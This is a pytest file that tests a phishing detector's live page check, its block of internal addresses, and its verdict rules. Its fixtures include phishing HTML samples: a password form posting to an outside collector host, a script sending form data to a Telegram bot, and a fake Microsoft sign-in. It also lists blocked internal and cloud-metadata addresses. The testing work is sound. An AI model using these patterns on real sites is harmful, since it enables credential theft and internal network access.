"""Live page check (page_check.py, pipeline.py): page signals, the network
guard and how findings change a verdict. No test opens a real web page -
pages are given as HTML and the fetch is replaced by a stub."""
import pytest

from app import page_check, pipeline
from app.page_check import BlockedAddress, _guard, analyse

from conftest import auth

U, S, I = "Unit", "Security", "Integration"


def codes(found):
    return {s["code"] for s in found["signals"]}


# ---------------------------------------------------------------------------
# Page signals
# ---------------------------------------------------------------------------
def test_password_form_to_other_site(tc):
    tc("Live page check", U, "A password form that sends to another website is a risk",
       "form action=https://collect-data.xyz/post.php on shop-example.com", "risk form_to_other_site")
    html = ('<title>Sign in</title><form action="https://collect-data.xyz/post.php">'
            '<input name="email"><input type="password" name="pw"></form>')
    found = analyse("https://www.shop-example.com/login", html)
    tc.actual(", ".join(sorted(codes(found))))
    assert "form_to_other_site" in codes(found)


def test_password_in_other_brand_name(tc):
    tc("Live page check", U, "A password asked for under another company's name is a risk",
       "title 'Sign in to Microsoft 365' with a password box on hosting-example.net",
       "risk foreign_brand_login")
    html = ('<title>Sign in to Microsoft 365</title><form action="next.php">'
            '<input type="email"><input type="password"></form>')
    found = analyse("https://files.hosting-example.net/o365/index.html", html)
    tc.actual(", ".join(sorted(codes(found))))
    assert "foreign_brand_login" in codes(found)
    assert not found["self_named"]


def test_own_login_page(tc):
    tc("Live page check", U, "A site's own sign-in page that names only itself is safe",
       "INTI eLearning login page on elearning.inti.edu.my", "self_named and own_login, no risk")
    html = ('<title>INTI eLearning: Log in to the site</title>'
            '<form action="/login/index.php" method="post"><input name="username">'
            '<input type="password" name="password"></form>')
    found = analyse("https://elearning.inti.edu.my/login/index.php", html)
    tc.actual(", ".join(sorted(codes(found))))
    assert found["self_named"]
    assert {"self_named", "own_login"} <= codes(found)
    assert not [s for s in found["signals"] if s["kind"] == "risk"]


def test_data_sent_to_chat_bot(tc):
    tc("Live page check", U, "Code that posts form data to a Telegram bot is a risk",
       "inline script calling api.telegram.org/bot...", "risk data_collector")
    html = ('<form><input type="password" id="pass"></form><script>'
            'fetch("https://api.telegram.org/bot123:abc/sendMessage", {method: "POST"})</script>')
    found = analyse("https://secure-update-portal.com/", html)
    tc.actual(", ".join(sorted(codes(found))))
    assert "data_collector" in codes(found)


def test_form_service_asking_password(tc):
    tc("Live page check", U, "An online form that asks for a password is a risk, the service's "
       "own warning footer is not", "Google Form with a 'Email password' question; one with "
       "only the footer", "risk only for the first")
    footer = "<p>Never submit passwords through Google Forms.</p>"
    asking = analyse("https://docs.google.com/forms/d/e/abc/viewform",
                     f"<title>Account check</title><div>Email password *</div>{footer}")
    plain = analyse("https://docs.google.com/forms/d/e/abc/viewform",
                    f"<title>Course survey</title><div>Your programme *</div>{footer}")
    tc.actual(f"asking: {sorted(codes(asking))}; footer only: {sorted(codes(plain))}")
    assert "form_asks_password" in codes(asking)
    assert "form_asks_password" not in codes(plain)


# ---------------------------------------------------------------------------
# Network guard
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("url", [
    "http://localhost:8000/", "http://127.0.0.1/", "http://10.0.0.5/admin",
    "http://169.254.169.254/latest/meta-data/", "http://example.com:22/", "ftp://example.com/",
])
def test_internal_addresses_never_opened(tc, url):
    tc("Live page check", S, "The page check refuses local, private and non-web addresses "
       "(no access to the internal network)", url, "BlockedAddress before any connection")
    with pytest.raises(BlockedAddress) as err:
        _guard(url)
    tc.actual(str(err.value))


# ---------------------------------------------------------------------------
# Verdict rules
# ---------------------------------------------------------------------------
def _page(signals, *, self_named=False, left_site=False, reachable=True, final_url="https://x.com/"):
    return {"url": "https://x.com/", "final_url": final_url, "chain": ["https://x.com/"],
            "left_site": left_site, "reachable": reachable, "status": 200, "error": None,
            "title": "", "self_named": self_named, "asks_secret": False, "signals": signals,
            "seconds": 0.1}


RISK = [{"kind": "risk", "code": "form_to_other_site", "text": "risk"}]
SAFE = [{"kind": "safe", "code": "self_named", "text": "safe"}]


def _verdict(prediction, reason=None, reputable=True):
    return {"prediction": prediction, "risk": "Medium", "uncertain_reason": reason,
            "legit_reason": None, "escalated_by": None,
            "reputation": {"reputable": reputable, "abused": False, "domain": "x.com", "rank": 10}}


@pytest.mark.parametrize("prediction, reason, reputable, page, expected", [
    ("uncertain", "borderline", False, _page(RISK), "phishing"),
    ("uncertain", "reputable_domain", True, _page(SAFE, self_named=True), "legitimate"),
    ("uncertain", "borderline", False, _page(SAFE, self_named=True), "uncertain"),
    ("uncertain", "reputable_domain", True, _page(SAFE, self_named=True, left_site=True), "uncertain"),
    ("uncertain", "short_link", True, _page(SAFE, self_named=True), "uncertain"),
    ("phishing", None, False, _page(SAFE, self_named=True), "phishing"),
])
def test_page_findings_change_verdict(tc, prediction, reason, reputable, page, expected):
    tc("Live page check", U, "Page findings move a Suspicious verdict one step; a safe page "
       "lowers it only on a well-established domain, never for a short link or a Phishing result",
       f"{prediction}/{reason}, reputable={reputable}, signals={[s['kind'] for s in page['signals']]}, "
       f"left_site={page['left_site']}", expected)
    verdict = _verdict(prediction, reason, reputable)
    pipeline.apply_page_check(verdict, page)
    tc.actual(verdict["prediction"])
    assert verdict["prediction"] == expected


# ---------------------------------------------------------------------------
# Through the API (page fetch replaced by a stub)
# ---------------------------------------------------------------------------
LOGIN_URL = "https://elearning.inti.edu.my/login/index.php"   # Suspicious on the URL alone


@pytest.fixture
def stub_page(monkeypatch):
    monkeypatch.setenv("PHISHGUARD_PAGE_CHECK", "1")
    pages = {}
    monkeypatch.setattr(page_check, "check", lambda url: pages[url])
    return pages


def test_scan_raised_by_page_check(client, user_token, stub_page, tc):
    tc("Live page check", I, "A Suspicious URL whose page sends the password to another "
       "website is shown as Phishing, by scan and explanation alike",
       LOGIN_URL + " with a stub page that has risk form_to_other_site",
       "phishing, escalated_by page_check")
    stub_page[LOGIN_URL] = _page(RISK, final_url=LOGIN_URL)
    scan = client.post("/api/scan", json={"url": LOGIN_URL}, headers=auth(user_token)).json()
    explain = client.post("/api/explain", json={"url": LOGIN_URL}, headers=auth(user_token)).json()
    tc.actual(f"scan {scan['prediction']}/{scan['escalated_by']}; explain {explain['prediction']}")
    assert scan["prediction"] == explain["prediction"] == "phishing"
    assert scan["escalated_by"] == "page_check"
    assert explain["why_detected"][0].startswith("Live page check:")


def test_scan_cleared_by_page_check(client, user_token, stub_page, tc):
    tc("Live page check", I, "A Suspicious URL on a well-established domain whose page is the "
       "site's own normal page is shown as Legitimate", LOGIN_URL + " with a safe self-named stub page",
       "legitimate, legit_reason page_check")
    stub_page[LOGIN_URL] = _page(SAFE, self_named=True, final_url=LOGIN_URL)
    scan = client.post("/api/scan", json={"url": LOGIN_URL}, headers=auth(user_token)).json()
    tc.actual(f"{scan['prediction']}/{scan['legit_reason']}")
    assert scan["prediction"] == "legitimate"
    assert scan["legit_reason"] == "page_check"


def test_short_link_followed(client, user_token, stub_page, tc):
    tc("Live page check", I, "A short link is followed and the address it opens decides the "
       "result", "https://bit.ly/abc123 -> https://www.youtube.com/watch?v=x (stub)",
       "Trusted Website for youtube.com, checked_url set")
    stub_page["https://bit.ly/abc123"] = _page([], left_site=True,
                                              final_url="https://www.youtube.com/watch?v=x")
    scan = client.post("/api/scan", json={"url": "https://bit.ly/abc123"},
                       headers=auth(user_token)).json()
    tc.actual(f"trusted={scan['trusted_domain']} matched={scan.get('matched_domain')} "
              f"checked={scan['checked_url']}")
    assert scan["trusted_domain"] is True
    assert scan["checked_url"] == "https://www.youtube.com/watch?v=x"
